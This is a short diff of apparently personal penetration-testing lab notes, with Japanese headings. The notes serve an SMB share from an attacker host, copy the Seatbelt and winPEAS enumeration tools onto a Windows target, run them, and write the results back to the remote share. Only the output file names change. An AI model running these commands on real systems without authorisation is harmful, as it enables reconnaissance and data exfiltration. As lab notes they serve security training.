@@ -14,7 +14,7 @@ impacket-smbserver -smb2support -username username -password pw share share
 # Target
 net use \\192.168.49.104\share /user:username pw
 cp \\192.168.49.104\share\Seatbelt.exe .
-.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result.txt
+.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result_jarvis.txt
 ```
 
 ### 実行結果抽出
@@ -39,7 +39,7 @@ impacket-smbserver -smb2support -username username -password pw share share
 cd ~
 net use \\192.168.49.104\share /user:username pw
 cp \\192.168.49.104\share\winPEASx64.exe .
-.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
+.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result_jarvis.txt
 ```
 
 ### 実行結果抽出
